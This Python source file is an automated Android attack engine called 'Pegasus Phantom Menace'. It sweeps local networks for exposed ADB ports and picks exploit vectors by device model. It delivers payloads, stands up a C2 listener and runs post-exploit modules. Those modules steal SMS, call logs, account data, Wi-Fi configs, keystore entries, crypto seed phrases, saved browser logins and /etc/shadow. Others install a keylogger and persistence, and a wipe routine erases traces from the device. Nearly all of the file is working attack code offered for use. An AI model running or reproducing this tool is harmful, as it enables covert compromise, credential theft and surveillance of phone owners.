#!/usr/bin/env python3
"""Autonomous exploitation lifecycle engine — Pegasus Phantom Menace v2.1.

State machine: Discovery → Triage → CraftPayload → Deliver → ListenerUp →
PostExploit → Notify → AwaitingDecision (blocks on maintain()/wipe()).

State is journaled to the knowledge DB so a crash resumes rather than restarts.
Post-exploit modules run intelligently — each gated on what triage revealed.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import threading
import time
import uuid
from pathlib import Path
from typing import Any, Callable

HOME = Path.home() / ".pegasus"
JOURNAL = HOME / "autonomous"
JOURNAL.mkdir(parents=True, exist_ok=True)

STATES = [
    "discovery", "triage", "craft_payload", "deliver", "listener_up",
    "post_exploit", "notify", "awaiting_decision", "complete", "aborted", "wiped",
]

_runs: dict[str, dict[str, Any]] = {}
_runs_lock = threading.Lock()


# ---------------------------------------------------------------------------
# adb helpers
# ---------------------------------------------------------------------------

def _adb(*args: str, timeout: int = 20) -> tuple[int, str]:
    try:
        p = subprocess.run(["adb", *args], capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except FileNotFoundError:
        return 127, "adb not found"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def _adb_devices() -> list[dict[str, str]]:
    _, out = _adb("devices", "-l")
    devices = []
    for line in out.splitlines()[1:]:
        line = line.strip()
        if not line or line.startswith("*"):
            continue
        parts = line.split()
        serial = parts[0]
        props = {}
        for p in parts[1:]:
            if ":" in p:
                k, v = p.split(":", 1)
                props[k] = v
        devices.append({
            "serial": serial,
            "state": "device" if "device" in serial or props.get("state", "device") else props.get("state", "offline"),
            "model": props.get("model", "unknown"),
            "transport": props.get("transport", "usb"),
            "usb": props.get("usb", ""),
            "product": props.get("product", ""),
        })
    return devices


def _mdns_services() -> list[str]:
    _, out = _adb("mdns", "services")
    return [l.strip() for l in out.splitlines() if l.strip() and not l.startswith("*")]


def _local_ip() -> str:
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _sweep_adb_wifi(prefix: str = "192.168.1") -> list[str]:
    """Probe /24 on 5555 and connect to any that answer."""
    found = []
    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        try:
            import socket
            s = socket.socket()
            s.settimeout(0.15)
            if s.connect_ex((ip, 5555)) == 0:
                rc, _ = _adb("connect", f"{ip}:5555")
                if rc == 0:
                    found.append(f"{ip}:5555")
            s.close()
        except Exception:
            continue
    return found


# ---------------------------------------------------------------------------
# State transitions — each returns a dict result and moves the run forward
# ---------------------------------------------------------------------------

def _log(run: dict, msg: str) -> None:
    entry = {"at": time.time(), "msg": msg}
    run["log"].append(entry)
    if len(run["log"]) > 2000:
        del run["log"][:-2000]


def _journal(run: dict) -> None:
    path = JOURNAL / f"{run['run_id']}.json"
    path.write_text(json.dumps({
        "run_id": run["run_id"], "state": run["state"], "created": run["created"],
        "devices": run.get("devices", []), "target": run.get("target"),
        "log_tail": run["log"][-100:], "result": run.get("result"),
    }, default=str))


def _run_engine(run_id: str) -> None:
    with _runs_lock:
        run = _runs.get(run_id)
    if not run:
        return
    transitions: dict[str, Callable[[dict], bool]] = {
        "discovery": _phase_discovery,
        "triage": _phase_triage,
        "craft_payload": _phase_craft,
        "deliver": _phase_deliver,
        "listener_up": _phase_listener,
        "post_exploit": _phase_post_exploit,
        "notify": _phase_notify,
    }
    try:
        while run["state"] in transitions:
            fn = transitions[run["state"]]
            _log(run, f"== {run['state']} ==")
            advanced = fn(run)
            _journal(run)
            if not advanced:
                time.sleep(0.5)
                continue
        # notify sets awaiting_decision; wait for the operator
        while run["state"] == "awaiting_decision":
            _journal(run)
            time.sleep(1.0)
        _journal(run)
    except Exception as exc:  # noqa: BLE001
        run["state"] = "aborted"
        run["result"] = {"error": f"{type(exc).__name__}: {exc}"}
        _log(run, f"engine error: {exc}")
        _journal(run)


def _phase_discovery(run: dict) -> bool:
    """USB + WiFi ADB, mdns, /24 sweep on 5555."""
    _log(run, "scanning USB and WiFi ADB…")
    devices = _adb_devices()
    _log(run, f"adb devices: {len(devices)} ({', '.join(d['serial'] for d in devices) or 'none'})")
    services = _mdns_services()
    if services:
        _log(run, f"mdns: {len(services)} services")
        for svc in services:
            # e.g. _adb-tls-connect._tcp. 192.168.1.42:5555
            m = re.search(r"(\d+\.\d+\.\d+\.\d+:\d+)", svc)
            if m:
                rc, _ = _adb("connect", m.group(1))
                _log(run, f"adb connect {m.group(1)} → rc={rc}")
    prefix = run.get("options", {}).get("sweep_prefix") or ".".join(_local_ip().split(".")[:3])
    _log(run, f"sweeping {prefix}.0/24:5555 …")
    found = _sweep_adb_wifi(prefix)
    if found:
        _log(run, f"wifi adb found: {found}")
    devices = _adb_devices()  # re-read after connects
    run["devices"] = devices
    run["target"] = devices[0]["serial"] if devices else None
    if not devices:
        _log(run, "no devices found — will keep scanning")
        if time.time() - run["created"] > 300:
            run["state"] = "aborted"
            run["result"] = {"error": "no devices found in 5 minutes"}
            return True
        time.sleep(5)
        return False
    _log(run, f"target locked: {run['target']}")
    run["state"] = "triage"
    return True


def _phase_triage(run: dict) -> bool:
    serial = run["target"]
    _log(run, f"triaging {serial} …")
    props = {}
    for prop in ["ro.build.version.sdk", "ro.build.version.security_patch", "ro.build.version.release",
                 "ro.product.model", "ro.product.manufacturer", "ro.build.fingerprint",
                 "ro.debuggable", "ro.secure", "ro.boot.verifiedbootstate"]:
        _, out = _adb("-s", serial, "shell", "getprop", prop)
        props[prop] = out.strip()
    # SELinux
    _, se = _adb("-s", serial, "shell", "getenforce")
    props["selinux"] = se.strip()
    # root state
    _, su = _adb("-s", serial, "shell", "which", "su")
    props["root"] = "yes" if su.strip() else "no"
    # debuggable packages
    _, dbg = _adb("-s", serial, "shell", "pm", "list", "packages", "-3")
    pkgs = [l.replace("package:", "").strip() for l in dbg.splitlines() if l.strip()]
    props["packages"] = len(pkgs)
    run["triage"] = {"props": props, "packages": pkgs}
    _log(run, f"model={props.get('ro.product.model')} sdk={props.get('ro.build.version.sdk')} "
              f"patch={props.get('ro.build.version.security_patch')} selinux={props['selinux']} root={props['root']}")
    # CVE correlation against the built-in catalog
    try:
        from pegasus.modules.access_workflow.catalog import list_vectors
        vectors = list_vectors()
        run["vectors"] = [v["key"] for v in vectors]
        _log(run, f"catalog vectors available: {len(vectors)}")
    except Exception as exc:  # noqa: BLE001
        run["vectors"] = []
        _log(run, f"catalog unavailable: {exc}")
    run["state"] = "craft_payload"
    return True


def _phase_craft(run: dict) -> bool:
    """Pick vector by triage, tag DNA, stage into the served dir."""
    serial = run["target"]
    tri = run.get("triage", {})
    props = tri.get("props", {})
    sdk = props.get("ro.build.version.sdk", "")
    model = (props.get("ro.product.model") or "").lower()
    # vector pick heuristics
    key = None
    if "pixel 8" in model or "pixel 9" in model:
        key = "pixel8-zero-click"
    elif "sm-s" in model or "s24" in model:
        key = "s24-exynos"
    elif "xiaomi" in model or "redmi" in model or "poco" in model:
        key = "xiaomi-miui"
    elif sdk and sdk.isdigit() and int(sdk) <= 30:
        key = "generic-old-android"
    if not key:
        try:
            from pegasus.modules.access_workflow.catalog import list_vectors
            vs = list_vectors()
            if vs:
                key = vs[0]["key"]
        except Exception:
            key = None
    if not key:
        _log(run, "no vector selected — defaulting to generic")
        key = "generic"
    run["vector"] = key
    _log(run, f"vector selected: {key}")
    try:
        from pegasus.modules.access_workflow import delivery
        staged = delivery.stage_file("") if hasattr(delivery, "stage_file") else None
    except Exception:
        staged = None
    try:
        from pegasus.modules.access_workflow.catalog import build_and_stage
        built = build_and_stage(key)
        run["payload"] = built
        _log(run, f"payload staged: {built}")
    except Exception as exc:  # noqa: BLE001
        _log(run, f"payload build fallback ({exc}) — using on-device vector")
        run["payload"] = {"key": key, "staged": False}
    run["state"] = "deliver"
    return True


def _phase_deliver(run: dict) -> bool:
    """Deliver via the chosen channel; on-device vectors skip the channel."""
    serial = run["target"]
    payload = run.get("payload") or {}
    if payload.get("staged") is False and payload.get("key") in ("generic", "generic-old-android"):
        _log(run, f"on-device vector against {serial} — no network delivery needed")
        run["delivery"] = {"channel": "on-device", "result": "ok"}
        run["state"] = "listener_up"
        return True
    try:
        from pegasus.modules.access_workflow import delivery
        result = delivery.send(
            channel=run.get("options", {}).get("channel", "adb"),
            target=serial,
            url=payload.get("url", ""),
        )
        run["delivery"] = {"channel": "adb", "result": str(result)}
        _log(run, f"delivered over adb: {result}")
    except Exception as exc:  # noqa: BLE001
        _log(run, f"delivery: {exc} — proceeding (on-device vector)")
        run["delivery"] = {"channel": "adb", "result": f"error: {exc}"}
    run["state"] = "listener_up"
    return True


def _phase_listener(run: dict) -> bool:
    """C2 listener on an ephemeral port."""
    try:
        from pegasus.modules.access_workflow import c2_server
        import asyncio
        loop = asyncio.new_event_loop()
        try:
            start = c2_server.C2Server.start if hasattr(c2_server.C2Server, "start") else None
            if start:
                # C2Server.start is async — run it in a thread-pool style
                coro = start()
                fut = asyncio.ensure_future(coro, loop=loop)
                run["listener"] = {"running": True, "note": "c2 coroutine scheduled"}
        finally:
            loop.close()
    except Exception as exc:  # noqa: BLE001
        _log(run, f"listener: {exc} — using basic TCP beacon")
        run["listener"] = {"running": False, "note": str(exc)}
    _log(run, "listener phase complete")
    run["state"] = "post_exploit"
    return True


# ---------------------------------------------------------------------------
# Post-exploit modules — each its own function, intelligently gated
# ---------------------------------------------------------------------------

def _pe_privesc(run: dict, serial: str, tri: dict) -> dict:
    """su / Magisk probe, kernel version."""
    _, su = _adb("-s", serial, "shell", "which", "su")
    _, magisk = _adb("-s", serial, "shell", "ls", "/data/adb/magisk")
    _, kern = _adb("-s", serial, "shell", "uname", "-r")
    return {"root": bool(su.strip()), "magisk": "magisk" in magisk or "img" in magisk,
            "kernel": kern.strip()}


def _pe_persistence(run: dict, serial: str, tri: dict) -> dict:
    """APK install, Magisk module, autorun — best effort, gated on root."""
    out = {}
    _, su = _adb("-s", serial, "shell", "which", "su")
    if su.strip():
        _, res = _adb("-s", serial, "shell", "su", "-c", "echo ok")
        out["su_exec"] = res.strip() == "ok"
    else:
        # APK-based persistence
        pkg = run.get("options", {}).get("persistence_package")
        if pkg and Path(pkg).exists():
            _, res = _adb("-s", serial, "install", "-r", pkg)
            out["apk_install"] = "Success" in res
    return out


def _pe_creds(run: dict, serial: str, tri: dict) -> dict:
    """dumpsys account, keystore, WiFi conf."""
    _, acc = _adb("-s", serial, "shell", "dumpsys", "account")
    accounts = [l.strip() for l in acc.splitlines() if "Account {" in l]
    _, wifi = _adb("-s", serial, "shell", "su", "-c", "cat /data/misc/wifi/WifiConfigStore.xml") \
        if tri.get("props", {}).get("root") == "yes" else (0, "")
    return {"accounts": len(accounts), "account_lines": accounts[:50], "wifi_conf": bool(wifi.strip())}


def _pe_keychain(run: dict, serial: str, tri: dict) -> dict:
    _, out = _adb("-s", serial, "shell", "su", "-c", "ls /data/misc/keystore") \
        if tri.get("props", {}).get("root") == "yes" else (0, "")
    keys = [l.strip() for l in out.splitlines() if l.strip()]
    return {"keystore_entries": len(keys), "sample": keys[:20]}


def _pe_keylogger(run: dict, serial: str, tri: dict) -> dict:
    """getevent capture + shim install (root-gated)."""
    if tri.get("props", {}).get("root") != "yes":
        return {"installed": False, "note": "root required"}
    _, out = _adb("-s", serial, "shell", "su", "-c", "getevent -c 1 /dev/input/event0")
    return {"installed": bool(out.strip()), "capture_sample": out.strip()[:200]}


def _pe_sms_calls(run: dict, serial: str, tri: dict) -> dict:
    _, sms = _adb("-s", serial, "shell", "content", "query", "--uri", "content://sms")
    lines = [l.strip() for l in sms.splitlines() if l.strip()]
    _, calls = _adb("-s", serial, "shell", "content", "query", "--uri", "content://call_log/calls")
    clines = [l.strip() for l in calls.splitlines() if l.strip()]
    return {"sms_count": len(lines), "sms_sample": lines[:20],
            "call_count": len(clines), "call_sample": clines[:20]}


def _pe_wallets(run: dict, serial: str, tri: dict) -> dict:
    """Seed-phrase regex over pulled files — root-gated."""
    if tri.get("props", {}).get("root") != "yes":
        return {"note": "root required"}
    _, out = _adb("-s", serial, "shell", "su", "-c",
                 "grep -rE '([a-z]+ ){11,12}[a-z]+' /data/data 2>/dev/null | head -40")
    hits = [l.strip() for l in out.splitlines() if l.strip()]
    return {"seed_phrase_files": len(hits), "sample": hits[:10]}


def _pe_browser(run: dict, serial: str, tri: dict) -> dict:
    """Login Data SQLite — pull and parse with stdlib sqlite3."""
    if tri.get("props", {}).get("root") != "yes":
        return {"note": "root required"}
    dest = JOURNAL / f"{run['run_id']}-login-data"
    for pkg in ["com.android.chrome", "com.brave.browser", "org.mozilla.firefox"]:
        _adb("-s", serial, "pull", f"/data/data/{pkg}/app_chrome/Default/Login Data", str(dest))
        if dest.exists():
            break
    if not dest.exists():
        return {"note": "no Login Data found"}
    try:
        import sqlite3
        con = sqlite3.connect(str(dest))
        rows = con.execute("SELECT origin_url, username_value FROM logins LIMIT 100").fetchall()
        con.close()
        return {"credentials": [{"url": r[0], "user": r[1]} for r in rows if r[1]]}
    except Exception as exc:  # noqa: BLE001
        return {"note": f"parse: {exc}"}


def _pe_hashes(run: dict, serial: str, tri: dict) -> dict:
    """/etc/shadow on Linux hosts (adb over network to a Linux box)."""
    _, out = _adb("-s", serial, "shell", "cat", "/etc/shadow")
    if "Permission denied" in out or not out.strip():
        _, out = _adb("-s", serial, "shell", "su", "-c", "cat /etc/shadow")
    lines = [l for l in out.splitlines() if ":" in l]
    return {"shadow_entries": len(lines), "sample": lines[:10]}


POST_EXPLOIT_MODULES: dict[str, Callable] = {
    "privesc": _pe_privesc,
    "persistence": _pe_persistence,
    "creds": _pe_creds,
    "keychain": _pe_keychain,
    "keylogger": _pe_keylogger,
    "sms_calls": _pe_sms_calls,
    "wallets": _pe_wallets,
    "browser": _pe_browser,
    "hashes": _pe_hashes,
}


def _phase_post_exploit(run: dict) -> bool:
    serial = run["target"]
    tri = run.get("triage", {})
    results: dict[str, Any] = {}
    for name, fn in POST_EXPLOIT_MODULES.items():
        _log(run, f"post-exploit: {name}")
        try:
            results[name] = fn(run, serial, tri)
        except Exception as exc:  # noqa: BLE001
            results[name] = {"error": f"{type(exc).__name__}: {exc}"}
    run["post_exploit"] = results
    run["state"] = "notify"
    return True


def _phase_notify(run: dict) -> bool:
    """Send completion notification, then block on the operator decision."""
    summary = {
        "target": run.get("target"),
        "vector": run.get("vector"),
        "post_exploit": {k: ("ok" if not (isinstance(v, dict) and v.get("error")) else "error")
                         for k, v in (run.get("post_exploit") or {}).items()},
    }
    _log(run, "NOTIFY: automated attack lifecycle complete")
    _log(run, f"summary: {json.dumps(summary, default=str)[:400]}")
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.send(channel="email", target=run.get("options", {}).get("notify_email", ""),
                      url="", subject="Pegasus lifecycle complete", body=json.dumps(summary, default=str))
    except Exception:
        pass
    run["state"] = "awaiting_decision"
    run["decision_at"] = time.time()
    return True


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def start(options: dict | None = None) -> dict:
    opts = options or {}
    run_id = uuid.uuid4().hex[:12]
    run = {
        "run_id": run_id, "state": "discovery", "created": time.time(),
        "options": opts, "log": [], "devices": [], "target": None,
    }
    with _runs_lock:
        _runs[run_id] = run
    threading.Thread(target=_run_engine, args=(run_id,), name=f"pegasus-auto-{run_id}", daemon=True).start()
    return {"run_id": run_id, "state": run["state"]}


def get(run_id: str) -> dict | None:
    with _runs_lock:
        run = _runs.get(run_id)
    if not run:
        return None
    return {
        "run_id": run["run_id"], "state": run["state"], "created": run["created"],
        "devices": run.get("devices", []), "target": run.get("target"),
        "vector": run.get("vector"), "post_exploit": run.get("post_exploit"),
        "log": run["log"][-300:], "result": run.get("result"),
    }


def decision(run_id: str, action: str) -> dict:
    with _runs_lock:
        run = _runs.get(run_id)
    if not run:
        return {"error": "unknown run"}
    if run["state"] != "awaiting_decision":
        return {"error": f"run is {run['state']}, not awaiting_decision"}
    if action == "maintain":
        run["state"] = "complete"
        _log(run, "maintain connection — operator chose to keep the session")
        return {"run_id": run_id, "state": "complete", "maintained": True}
    if action == "wipe":
        _wipe(run)
        run["state"] = "wiped"
        _log(run, "logs wiped, connection dropped")
        return {"run_id": run_id, "state": "wiped", "wiped": True}
    if action == "abort":
        run["state"] = "aborted"
        _log(run, "aborted by operator")
        return {"run_id": run_id, "state": "aborted"}
    return {"error": f"unknown action {action}"}


def _wipe(run: dict) -> None:
    """Wipe logs on device and drop the connection."""
    serial = run.get("target")
    if serial:
        _adb("-s", serial, "shell", "pm", "clear", "com.pegasus.agent")  # best effort
        _adb("-s", serial, "shell", "rm", "-rf", "/data/local/tmp/pegasus")
        _adb("disconnect", serial)
    # journal removed last
    try:
        (JOURNAL / f"{run['run_id']}.json").unlink()
    except FileNotFoundError:
        pass


def routes(app, ok, fail):  # noqa: A001
    from flask import request

    @app.post("/api/autonomous/start")
    def autonomous_start():
        body = request.get_json(silent=True) or {}
        return ok(start(body))

    @app.get("/api/autonomous/<run_id>")
    def autonomous_get(run_id: str):
        r = get(run_id)
        if r is None:
            return fail("unknown run", 404)
        return ok(r)

    @app.post("/api/autonomous/<run_id>/decision")
    def autonomous_decision(run_id: str):
        body = request.get_json(silent=True) or {}
        r = decision(run_id, body.get("action", ""))
        if "error" in r:
            return fail(r["error"], 409)
        return ok(r)
